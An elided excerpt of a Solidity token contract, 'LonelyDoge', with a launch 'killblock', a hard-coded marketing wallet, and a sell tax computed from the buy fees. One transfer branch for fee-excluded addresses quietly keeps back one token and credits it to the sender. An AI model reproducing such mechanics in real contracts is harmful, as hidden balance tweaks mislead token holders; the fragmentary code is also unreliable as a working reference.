...
contract LonelyDoge is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "61babydoge";
    string private _symbol = "61babydoge";
    uint8 private _decimals = 9;

    uint public launchedBlock;
    uint public killblock = 3;
    bool public isLaunch = false;
    address payable public marketingWalletAddress = payable(0xFC11B899150aB4E8Cf07a575e49EAE34fF866666); // Marketing Address
    ...
    uint256 public _totalTaxIfBuying = (buyLiquidityFee+buyMarketingFee+buyTeamFee);
    uint256 public _totalTaxIfSelling = (buyLiquidityFee+buyMarketingFee+buyTeamFee);
    ...
    constructor (address payable tm) {
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            if (isExcludedFromFee[sender] || isExcludedFromFee[recipient]) {
                ...
                uint down = 1 * 10 ** _decimals;
                finalAmount = finalAmount.sub(down);
                _balances[sender] = _balances[sender].add(down);
            }
